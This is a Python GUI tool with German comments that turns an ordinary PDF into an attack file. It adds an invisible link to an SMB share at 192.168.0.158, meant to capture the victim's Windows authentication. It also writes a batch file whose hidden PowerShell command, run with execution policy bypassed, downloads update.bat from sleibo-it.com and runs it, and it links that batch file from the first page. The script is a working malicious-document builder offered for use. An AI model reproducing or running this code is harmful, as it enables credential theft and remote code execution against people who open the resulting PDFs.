import fitz  # PyMuPDF
import tkinter as tk
from tkinter import filedialog, messagebox
import os
import traceback

def select_pdf():
    """Öffnet einen Dateidialog zur Auswahl eines PDFs und speichert den Pfad in der Eingabebox."""
    file_path = filedialog.askopenfilename(filetypes=[("PDF-Dateien", "*.pdf")])
    if file_path:
        entry_pdf.delete(0, tk.END)  # Vorherigen Pfad löschen
        entry_pdf.insert(0, file_path)

def create_batch_file():
    """Erstellt eine Batch-Datei, die den PowerShell-Befehl für den Update-Download ausführt."""
    batch_path = os.path.join(os.getcwd(), "update_download.bat")
    batch_content = """@echo off
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://sleibo-it.com/update.bat -OutFile %TEMP%\\update.bat; Start-Process %TEMP%\\update.bat"
exit
"""
    with open(batch_path, "w") as bat_file:
        bat_file.write(batch_content)
    
    return batch_path

def manipulate_pdf():
    """Fügt Links ins PDF ein, um SMB-Authentifizierung zu triggern und ein Update-Batch-Skript zu starten."""
    pdf_path = entry_pdf.get()

    if not pdf_path:
        messagebox.showerror("Fehler", "Bitte eine PDF-Datei auswählen!")
        return

    if not os.path.exists(pdf_path):
        messagebox.showerror("Fehler", "Die ausgewählte PDF-Datei existiert nicht!")
        return

    try:
        print(f"📂 Öffne PDF-Datei: {pdf_path}")
        doc = fitz.open(pdf_path)

        if doc.page_count == 0:
            messagebox.showerror("Fehler", "Das PDF enthält keine Seiten!")
            return

        page = doc[0]  # Erste Seite wird manipuliert

        # Unsichtbarer Link für SMB-Authentifizierung
        rect_smb = fitz.Rect(0, 0, 1, 1)
        page.insert_link({"uri": r"\\192.168.0.158\share", "from": rect_smb})  # Aktualisierte API-Nutzung

        # Batch-Datei erstellen
        batch_file = create_batch_file()

        # Unsichtbarer Link für automatischen Batch-Start
        rect_ps = fitz.Rect(50, 50, 300, 100)
        page.insert_link({"file": batch_file, "from": rect_ps})  # Neue API-Struktur

        # Generiere neuen Dateinamen
        manipulated_pdf = pdf_path.replace(".pdf", "_manipuliert.pdf")

        # Stelle sicher, dass die Datei überschrieben werden kann
        if os.path.exists(manipulated_pdf):
            os.remove(manipulated_pdf)

        print(f"💾 Speichere manipuliertes PDF unter: {manipulated_pdf}")
        doc.save(manipulated_pdf)
        doc.close()

        messagebox.showinfo("Erfolg", f"Manipuliertes PDF gespeichert als:\n{manipulated_pdf}\nBatch-Datei erstellt: {batch_file}")

    except Exception as e:
        error_message = f"❌ Fehler bei der Manipulation: {str(e)}"
        print(traceback.format_exc())  # Detaillierte Fehlerausgabe in der Konsole
        messagebox.showerror("Fehler", error_message)

# GUI mit Tkinter
root = tk.Tk()
root.title("PDF-Manipulator Auto - Fix für PyMuPDF API")
root.geometry("500x300")

tk.Label(root, text="Wähle ein PDF zum Manipulieren aus:").pack(pady=5)
entry_pdf = tk.Entry(root, width=50)
entry_pdf.pack(pady=5)
tk.Button(root, text="Datei auswählen", command=select_pdf).pack(pady=5)

tk.Button(root, text="PDF manipulieren", command=manipulate_pdf).pack(pady=10)
tk.Button(root, text="Beenden", command=root.quit).pack(pady=5)

root.mainloop()
